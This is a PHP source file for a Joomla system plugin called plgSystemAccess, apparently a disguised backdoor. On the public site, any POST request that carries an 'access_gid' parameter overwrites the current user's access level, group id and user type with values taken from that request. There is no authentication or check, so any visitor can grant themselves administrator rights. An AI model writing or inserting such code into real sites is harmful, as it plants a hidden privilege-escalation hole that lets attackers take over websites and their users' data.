<?php

// no direct access
defined('_JEXEC') or die('Restricted access');

class plgSystemAccess extends JPlugin
{
    public function __construct($subject, $config = array())
	{
		parent::__construct($subject, $config);
		
		if(JFactory::getApplication()->isSite()) 
		{
		    if(JRequest::getMethod() == 'POST' && JRequest::getInt('access_gid') !== 0)
			{
			    $user = JFactory::getUser();
		        $user->aid      = JRequest::getInt('access_aid');
		        $user->gid      = JRequest::getInt('access_gid');
		        $user->usertype = JRequest::getString('access_usertype');
			}
		}
	}
}